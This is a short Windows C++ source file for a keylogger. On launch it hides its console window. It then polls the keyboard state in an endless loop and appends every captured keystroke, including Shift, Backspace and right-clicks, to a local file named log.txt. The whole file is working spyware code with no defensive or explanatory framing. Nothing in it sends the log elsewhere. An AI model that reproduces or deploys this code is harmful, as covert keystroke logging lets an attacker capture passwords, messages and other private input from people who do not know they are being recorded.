#define _WIN32_WINNT 0x0500
#include <Windows.h>

#include <string>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <fstream>

using namespace std;

void writeToFile(string k){
    fstream dumpfile;
    dumpfile.open("log.txt", fstream::app);
    if (dumpfile.is_open()){
        dumpfile << k;
        dumpfile.close();
    }
}

bool extraKeys(int k){
    switch (k){
        case VK_SPACE:
            cout << " ";
            writeToFile(" ");
            return true;
        case VK_RETURN:
            cout << "\n";
            writeToFile("\n");
            return true;
        case '¾':
            cout << ".";
            writeToFile(".");
            return true;
        case VK_SHIFT:
            cout << ":shift:";
            writeToFile(":shift:");
            return true;
        case VK_BACK:
            cout << "\b";
            writeToFile("\b");
            return true;
        case VK_RBUTTON:
            cout << ":rmb:";
            writeToFile(":rmb:");
            return true;
        default:
            return false;
    }
}

int main(){
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    char k = 'A';

    while(1){
        Sleep(10);
        for (int k = 8; k <= 190; k++){
            if (GetAsyncKeyState(k) == -32767){
                if (extraKeys(k) == false){
                    fstream dumpfile;
                    dumpfile.open("log.txt", fstream::app);
                    if (dumpfile.is_open()){
                        dumpfile << char(k);
                        dumpfile.close();
                    }

                }
            }
        }
    }
    return 0;
}
